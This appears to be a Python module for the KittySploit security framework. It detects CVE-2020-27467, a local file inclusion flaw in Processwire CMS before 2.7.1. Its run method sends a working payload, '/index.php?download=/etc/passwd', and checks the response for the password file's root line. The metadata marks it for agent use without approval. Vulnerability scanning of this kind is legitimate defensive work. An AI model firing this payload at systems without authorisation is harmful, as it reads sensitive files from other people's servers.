#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Processwire CMS prior to 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Processwire CMS <2.7.1 - Local File Inclusion Detection',
        'description': 'Processwire CMS prior to 2.7.1 is vulnerable to local file inclusion because it allows a remote attacker to retrieve sensitive files via the download parameter to index.php.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'processwire', 'lfi', 'cms', 'oss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/Y1LD1R1M-1337/LFI-ProcessWire',
            'https://processwire.com/',
            'https://github.com/ceng-yildirim/LFI-processwire',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-27467',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2020-27467',
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php?download=/etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Processwire CMS <2.7.1 - Local File Inclusion detected",
                path='/index.php?download=/etc/passwd',
            )
            return True
        return False

